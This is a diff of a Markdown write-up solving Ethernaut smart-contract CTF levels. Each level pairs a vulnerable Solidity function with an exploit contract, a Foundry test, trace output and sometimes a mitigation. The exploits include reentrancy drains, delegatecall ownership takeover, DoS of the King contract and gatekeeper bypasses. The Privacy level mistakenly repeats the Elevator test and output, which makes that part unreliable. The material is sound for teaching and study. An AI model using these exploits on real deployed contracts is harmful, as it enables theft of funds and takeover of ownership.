@@ -9,16 +9,14 @@ tags: [ctfs, blockchain]
 
 
 
-
-
 # Ethernaut Challenges
 
-🔗 **GitHub**: [View](https://github.com/BLOCK-PROGRAMR/SCATER70/tree/main/ctf/ethernaut)
+ **GitHub**: [View](https://github.com/SCATERLABs/CTFs/tree/0465130a63d25a8078a39b3241c9a8c7e101b7f1/EthernautChallenges)
 
 
 ## Level 1: Hello Ethernaut
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 ```solidity
 function authenticate(string memory passkey) public {
     if (
@@ -32,7 +30,7 @@ function authenticate(string memory passkey) public {
 
 **Vulnerability**: The `password` variable is marked as `public`, which allows anyone to call `.password()` and get the secret directly.
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity
 function test_pass_attack() public {
     vm.startPrank(attacker);
@@ -62,7 +60,7 @@ function test_attack() public {
 
 ## Level 2: Fallback
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 ```solidity
 receive() external payable {
     require(msg.value > 0 && contributions[msg.sender] > 0);
@@ -72,7 +70,7 @@ receive() external payable {
 
 **Vulnerability**: The fallback function allows any contributor to become the `owner` by sending ETH directly to the contract. The original `owner` logic is also flawed—it can be overtaken easily by minimal contributions.
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity
 function test_attack() public {
     vm.startPrank(attacker);
@@ -110,7 +108,7 @@ function test_withdraw() public {
 
 ## Level 3: Fallout
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 ```solidity
 function Fal1out() public payable {
     owner = payable(msg.sender);
@@ -120,7 +118,7 @@ function Fal1out() public payable {
 
 **Vulnerability**: The function `Fal1out()` is incorrectly named. It looks like a constructor but is actually a public function. Anyone can call it and become the `owner`.
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity
 function test_attack() public {
     vm.startPrank(attacker2);
@@ -142,7 +140,7 @@ function test_attack() public {
 
 ## Level 4: CoinFlip
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 ```solidity
 function flip(bool _guess) public returns (bool) {
     uint256 blockValue = uint256(blockhash(block.number - 1));
@@ -167,7 +165,7 @@ function flip(bool _guess) public returns (bool) {
 
 **Vulnerability**: Uses predictable `blockhash` to generate randomness. The attacker can precompute the same value and always win the flip.
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity
 function test_attack() public {
     vm.startPrank(attacker);
@@ -191,7 +189,7 @@ function test_attack() public {
 
 ## Level 5: Telephone
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 ```solidity
 function changeOwner(address _owner) public {
     if (tx.origin != msg.sender) {
@@ -202,7 +200,7 @@ function changeOwner(address _owner) public {
 
 **Vulnerability**: The contract uses `tx.origin` instead of `msg.sender` for access control. An attacker can create a contract that calls this function, with the `tx.origin` being a user (player), and `msg.sender` being the attack contract. This bypasses the condition and changes the ownership.
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity
 function test_attack() public {
     vm.startPrank(attacker);
@@ -226,7 +224,7 @@ function test_attack2() public {
 
 ## Level 6:Delegation
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 
 ```solidity
 fallback() external {
@@ -239,7 +237,7 @@ fallback() external {
 
 **Vulnerability**: The Delegation contract uses delegatecall to execute code from the Delegate contract within the context of its own storage. This means an attacker can call a function like pwn() on Delegation, which executes pwn() in Delegate and updates the owner of Delegation, not Delegate.
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity
 function test_attack() public {
     vm.startPrank(attacker);
@@ -256,7 +254,7 @@ function test_attack() public {
 
 ## Level 7:Force
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 
 ```solidity
 // Force contract has no receive/fallback or payable function
@@ -267,7 +265,7 @@ contract Force {
 
 **Vulnerability**: Ether can still be forcibly sent using selfdestruct.
 
-### 🛠️  Exploit Contract (ForceDestruct)
+###     Exploit Contract (ForceDestruct)
 ```solidity
  contract ForceDestruct {
     function attack(address payable _contract) public payable {
@@ -277,7 +275,7 @@ contract Force {
 
 ```
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity 
     function test_attack() public {
     vm.startPrank(attacker);
@@ -288,7 +286,7 @@ contract Force {
     }
 
 ```
-### 📋 Test Output
+###  Test Output
 ``` text
 [PASS] test_attack() (gas: 131011)
 Traces:
@@ -307,7 +305,7 @@ Suite result: ok. 1 passed; 0 failed; finished in 6.73ms
 
 ## Level 8:Valut
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 
 ```solidity
  bool public locked;//storage slot0
@@ -323,7 +321,7 @@ function unlock(bytes32 _password) public {
 **Vulnerability**: Although password is marked as private, all contract storage is publicly accessible. In Solidity, the private keyword only restricts access within the Solidity language, not from the blockchain level. So, the password stored at storage slot 1 can be retrieved using vm.load.
 
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity 
    function test_attack() public {
     vm.startPrank(attacker);
@@ -334,7 +332,7 @@ function unlock(bytes32 _password) public {
     vm.stopPrank();
 }
 ```
-### 📋 Test Output
+### Test Output
 ``` text
 [PASS] test_attack() (gas: 11812)
 Traces:
@@ -352,7 +350,7 @@ Suite result: ok. 1 passed; 0 failed; finished in 1.24ms
 
 ## Level 9:Token
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 
 ```solidity
  function transfer(address _to, uint256 _value) public returns (bool) {
@@ -367,11 +365,11 @@ Suite result: ok. 1 passed; 0 failed; finished in 1.24ms
 
 **Vulnerability**: The transfer() function is written with an unchecked block, allowing underflow to occur. When a user transfers more tokens than they own, the subtraction balances[msg.sender] -= _value underflows and wraps around to a massive value (2**256 - x), resulting in an increased balance instead of failing.
 
-📝 Note: This kind of underflow attack was possible before Solidity 0.8.x, which introduced built-in overflow/underflow protection.
+ Note: This kind of underflow attack was possible before Solidity 0.8.x, which introduced built-in overflow/underflow protection.
 To demonstrate this vulnerability in a controlled environment, unchecked is intentionally used to bypass that protection for educational purposes
 
 
-### 🧪 Exploit Test
+###  Exploit Test
 ```solidity 
    function test_attack() public {
     vm.startPrank(player);
@@ -390,7 +388,7 @@ To demonstrate this vulnerability in a controlled environment, unchecked is inte
     vm.stopPrank();
 }
 ```
-### 📋 Test Output
+###  Test Output
 ``` text
 [PASS] test_attack() (gas: 47312)
 Traces:
@@ -417,12 +415,12 @@ In the King level, a smart contract becomes the king and blocks future kings by 
 This locks the contract and nobody else can play the game.
 DoS attacks make the contract unusable for honest users.
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 
 ```solidity
 receive() external payable {
     require(msg.value >= prize || msg.sender == owner);
-    payable(king).transfer(msg.value); // ❌ vulnerable to DoS
+    payable(king).transfer(msg.value); // vulnerable to DoS
     king = msg.sender;
     prize = msg.value;
 }
@@ -431,7 +429,7 @@ receive() external payable {
 
 **Vulnerability**: The transfer call to the current king can fail if the king is a contract that reverts on receiving ETH. This leads to a Denial of Service (DoS) where no one can become king anymore.
 
-### 🛠️  Exploit Contract 
+###     Exploit Contract 
 ```solidity
  contract Attacker {
     King public king;
@@ -452,20 +450,20 @@ receive() external payable {
 }
 ```
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity 
    function test_attack() public {
     vm.prank(attackerEOA);
     attack.attack{value: 2 ether}(); // attacker becomes king
 
-    assertEq(king._king(), address(attack)); // ✅ attacker is king
+    assertEq(king._king(), address(attack)); //  attacker is king
 
     vm.prank(player);
     (bool success, ) = address(king).call{value: 3 ether}(""); // another player tries
-    assertFalse(success, "Player should not be able to become king anymore"); // ❌ fails
+    assertFalse(success, "Player should not be able to become king anymore"); //  fails
 }
 ```
-### 📋 Test Output
+### Test Output
 ``` text
 [PASS] test_attack() (gas: 71672)
 Traces:
@@ -493,7 +491,7 @@ Suite result: ok. 1 passed; 0 failed; finished in 15.46ms
 **AttackDesc**:
 This is a reentrancy attack, where the attacker recursively calls the withdraw function within the fallback/receive function before the contract's state is updated, allowing them to drain all the funds.
 
-### 🔍 Vulnerable Function
+### Vulnerable Function
 
 ```solidity
 function withdraw(uint256 _amount) public {
@@ -512,7 +510,7 @@ function withdraw(uint256 _amount) public {
 This allows an attacker to recursively call withdraw() in the fallback/receive function before their balance is updated.
 Because of this, the same balance can be withdrawn multiple times, draining the entire contract balance
 
-### 🛠️  Exploit Contract 
+###     Exploit Contract 
 ```solidity
  contract Attack {
     Reentrance public reentrance;
@@ -536,7 +534,7 @@ Because of this, the same balance can be withdrawn multiple times, draining the 
 }
 ```
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity 
   function test_attack() public {
     vm.startPrank(attacker);
@@ -552,7 +550,7 @@ Because of this, the same balance can be withdrawn multiple times, draining the 
     vm.stopPrank();
 }
 ```
-### 📋 Test Output
+###  Test Output
 ``` text
 Logs:
   balance of the contract before 1000000000000000000
@@ -575,10 +573,10 @@ Use the Checks-Effects-Interactions pattern to prevent reentrancy:
   function withdraw(uint256 _amount) public {
     require(balances[msg.sender] >= _amount, "Insufficient balance");
 
-    // ✅ Effect: update state before interaction
+    //  Effect: update state before interaction
     balances[msg.sender] -= _amount;
 
-    // ✅ Interaction: external call after state change
+    // Interaction: external call after state change
     (bool success, ) = msg.sender.call{value: _amount}("");
     require(success, "Transfer failed");
 }
@@ -592,7 +590,7 @@ However, it makes two separate calls to this function and does not expect the re
 
 This allows an attacker to manipulate the response by returning different values in consecutive calls, thus tricking the contract into thinking it has reached the top floor.
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 
 ```solidity
 function goTo(uint256 _floor) public {
@@ -610,9 +608,9 @@ function goTo(uint256 _floor) public {
 
 An attacker can change their response between these two calls by flipping the return value, thus bypassing the logic
 
-### 🛠️  Exploit Contract
-✅ First call to isLastFloor returns false → passes the if check.
-✅ Second call returns true → sets top = true.
+###   Exploit Contract
+ First call to isLastFloor returns false → passes the if check.
+ Second call returns true → sets top = true.
 
 ```solidity
  contract BuildingAttack is Building {
@@ -633,7 +631,7 @@ An attacker can change their response between these two calls by flipping the re
     }
 }
 ```
-### 🧪 Exploit Test
+###  Exploit Test
 ```solidity 
   function test_attack() public {
     attackerContract.attack(); // Call via attacker
@@ -641,14 +639,14 @@ An attacker can change their response between these two calls by flipping the re
     assertEq(elevator.floor(), 1);
 }
 ```
-### 📋 Test Output
+###  Test Output
 ``` text
 [PASS] test_attack() (gas: 67276)
 Elevator::top() → true
 Elevator::floor() → 1
 
 ```
-### 🔒Recommended Mitigation
+### Recommended Mitigation
 Ensure external calls are not made multiple times for critical logic — or cache the result:
 ``` solidity
 function goTo(uint256 _floor) public {
@@ -668,7 +666,7 @@ The contract stores a private bytes32[3] array called data, and the unlock() fun
 
 Even though the array is marked private, all contract storage is publicly accessible on the blockchain — which means the attacker can read the storage slot directly using vm.load in Foundry or with web3.eth.getStorageAt in a live attack.
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 ```solidity
 function unlock(bytes16 _key) public {
     require(_key == bytes16(data[2]));
@@ -689,7 +687,7 @@ Solidity stores contract variables sequentially in storage slots:
 
 ⚡Slot 5 holds data[2] — and the unlock() function casts it to bytes16, so we only need the first 16 bytes.
 
-### 🛠️  Exploit Contract
+###     Exploit Contract
 vm.load() reads the raw 32 bytes from a given storage slot.
 The value is then cast to bytes16 and passed into the unlock() function.
 
@@ -704,7 +702,7 @@ function test_attack() public {
 ```
 
 
-### 🧪 Exploit Test
+###   Exploit Test
 ```solidity 
   function test_attack() public {
     attackerContract.attack(); // Call via attacker
@@ -712,7 +710,7 @@ function test_attack() public {
     assertEq(elevator.floor(), 1);
 }
 ```
-### 📋 Test Output
+###  Test Output
 ``` text
 [PASS] test_attack() (gas: 67276)
 Elevator::top() → true
@@ -738,7 +736,7 @@ function goTo(uint256 _floor) public {
 **AttackDesc**:
 To bypass the three gates in the GatekeeperOne contract, we strategically crafted a call using a helper contract and brute-forced gas.
 
-### 🔍 Vulnerable Function
+### Vulnerable Function
 
 ``` solidity
 // SPDX-License-Identifier: MIT
@@ -792,7 +790,7 @@ But full gateKey must not equal the last 4 bytes alone.
 
 This forces manipulation of only the lower 2 bytes of a crafted bytes8.
 
-### 🛠️  Exploit Contract
+###     Exploit Contract
 
 
 Gate One: Bypassed using an external contract call (attacker != tx.origin).
@@ -856,7 +854,7 @@ contract GateKeeperOneTest is Test {
 }
 
 ```
-### 📋 Test Output
+###  Test Output
 
 ``` text
     [PASS] test_attack() (gas: ~XXXXX)
@@ -879,7 +877,7 @@ Traces:
 **Attack Description**:
 To bypass the three gates in the GatekeeperTwo contract, we strategically crafted a call using a helper contract.
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -931,7 +929,7 @@ contract GatekeeperTwo {
 3.Gate Three: Requires that A^B = C where A is the result of hashing the msg.sender. By solving for B, we can craft the correct _gateKey.
 
 
-### 🛠️  Exploit Contract
+###     Exploit Contract
 
 Gate One: Bypassed using an external contract call.
 
@@ -979,7 +977,7 @@ contract Attack {
     }
 }
 ```
-### 📋 Test Output
+###  Test Output
 ``` text
 [PASS] test_attack() (gas: 142998)
 Logs:
@@ -1007,7 +1005,7 @@ Ran 1 test suite in 1.21s (20.01ms CPU time): 1 tests passed, 0 failed, 0 skippe
 
 **AttackDesc**:The contract uses a lockTokens modifier to restrict the transfer function, preventing the original player from transferring tokens until a 10-year timelock has passed. However, the contract does not restrict transferFrom, which is part of the ERC20 standard. By approving a spender (attacker), the tokens can be transferred out before the timelock.
 
-### 🔍 Vulnerable Function
+### Vulnerable Function
 ``` solidity
 function transfer(
     address _to,
@@ -1020,7 +1018,7 @@ function transfer(
 The lockTokens modifier only applies to the transfer() function.
 Since transferFrom() is inherited from the ERC20 base and not overridden, it bypasses the timelock restriction. This allows a player to approve someone else (e.g., an attacker) to transfer all tokens out immediately.
 
-### 🧪 Exploit Test
+###  Exploit Test
 ``` solidity
 function test_attack() public {
     // player approves attacker to spend unlimited tokens
@@ -1038,18 +1036,18 @@ function test_attack() public {
     vm.stopPrank();
 }
 ```
-### 📋 Test Output
+###  Test Output
 ``` text
 [PASS] test_attack() (gas: 74257)
 ...
 NaughtCoin::approve(attacker, max)
 NaughtCoin::transferFrom(player → attacker, 1_000_000 tokens)
-✅ Final balances:
+ Final balances:
 - attacker: 1_000_000 tokens
 - player: 0 tokens
 
 ```
-### 🔒 Recommended Mitigation
+###  Recommended Mitigation
 
 Override the transferFrom() function and apply the same lockTokens modifier:
 ``` solidity
@@ -1070,7 +1068,7 @@ Alternatively, enforce the timelock check for the player address directly within
 
 **AttackDesc**:
 The contract uses delegatecall to external library contracts. Since the library contract has only one storage variable at slot 0 (storedTime), but the main contract stores important variables like owner at slot 2, an attacker can manipulate storage by crafting a malicious library that writes to any slot, including the owner slot. The attacker first overwrites the timeZone1Library address, then performs a delegatecall to their malicious contract to gain ownership.
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 ``` solidity
 function setFirstTime(uint256 _timeStamp) public {
     timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
@@ -1082,7 +1080,7 @@ Uses delegatecall with untrusted input.
 Delegatecall executes the called function in the context of Preservation, altering its storage layout.
 
 The function setTime(uint256) is expected to write to slot 0 (storedTime), but due to delegatecall, it may write to unintended slots like owner (slot 2).
-### 🛠️ Exploit Contract
+###  Exploit Contract
 
 ``` solidity
 contract AttackLibrary {
@@ -1094,7 +1092,7 @@ contract AttackLibrary {
     }
 }
 ```
-### 🧪 Exploit Test
+###  Exploit Test
 ``` solidity
 function test_attack() public {
     vm.startPrank(attacker);
@@ -1118,7 +1116,7 @@ function test_attack() public {
 }
 ```
 
-### 📋 Test Output
+###  Test Output
 ``` text
 [PASS] test_attack() (gas: 98607)
 
@@ -1135,7 +1133,7 @@ Traces:
     │       └─ storage slot 2 updated with attacker address
     └─ stopPrank()
 ```
-### 🔒 Recommended Mitigation
+###  Recommended Mitigation
 Do not use delegatecall with untrusted contracts.
 
 If absolutely needed:
@@ -1154,7 +1152,7 @@ Prefer standard proxy patterns (like OpenZeppelin’s Transparent Proxy or UUPS)
 **AttackDesc:**
 When contracts are deployed via new, their addresses are deterministic and based on the deployer’s address and nonce. In this challenge, the Recovery contract creates a SimpleToken contract using new, which means its address can be calculated off-chain or in a test. Once the address is recovered, the attacker can call its public destroy(address) function to selfdestruct the contract and reclaim trapped Ether.
 
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 ``` solidity
 function generateToken(string memory _name, uint256 _initialSupply) public {
     new SimpleToken(_name, msg.sender, _initialSupply);
@@ -1264,7 +1262,7 @@ function computeAddress(
     }
 ```
 
-### 🧪 Exploit Test
+###   Exploit Test
 ``` solidity
 function test_attack() public {
     address lostToken = computeAddress(address(recovery), 1);//find the address
@@ -1281,7 +1279,7 @@ function test_attack() public {
     assertGt(attackerAfter, attackerBefore); // ensure attacker received ether
 }
 ```
-### 📋 Test Output
+###  Test Output
 
 ``` text
 [PASS] test_attack() (gas: 25440)
@@ -1303,7 +1301,7 @@ Traces:
 
 **AttackDesc:**
 The contract allows setting a solver address that is expected to return the number 42 when called via staticcall. However, no validation is done on the logic inside the solver. An attacker can deploy a hand-crafted minimal contract using raw EVM bytecode that always returns 42 regardless of input. A hidden constraint (present in the original Ethernaut challenge but not in the simplified local version) is that the runtime bytecode must be ≤ 10 bytes. If the contract's code exceeds 10 bytes, the challenge reverts, requiring extremely optimized bytecode logic.
-### 🔍 Vulnerable Function
+###  Vulnerable Function
 ``` solidity
 function setSolver(address _solver) public {
     solver = _solver;
@@ -1315,8 +1313,8 @@ The contract later low level calls this solver, expecting a return value of 42.
 
 Ethernaut's backend enforces a maximum of 10 bytes runtime code for the solver.
 
-### 🛠️ Exploit Contract(evm bytecode)
-**🔧 Runtime Bytecode**
+###    Exploit Contract(evm bytecode)
+**Runtime Bytecode**
 ``` evm
 602a    → PUSH1 0x2a        // Push 42 onto the stack  
 6000    → PUSH1 0x00        // Memory offset 0  
@@ -1343,7 +1341,7 @@ bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
 ```
  Result: A contract that always returns 42 with only 10 bytes of runtime code.
 
-### 🧪 Exploit Test
+###   Exploit Test
 ``` solidity
 function test_attack() public {
     vm.startPrank(attacker);
@@ -1368,7 +1366,7 @@ function test_attack() public {
     vm.stopPrank();
 }
 ```
-### 📋 Test Output
+###  Test Output
 ``` text
 [PASS] test_attack() (gas: 72019)
 Logs:
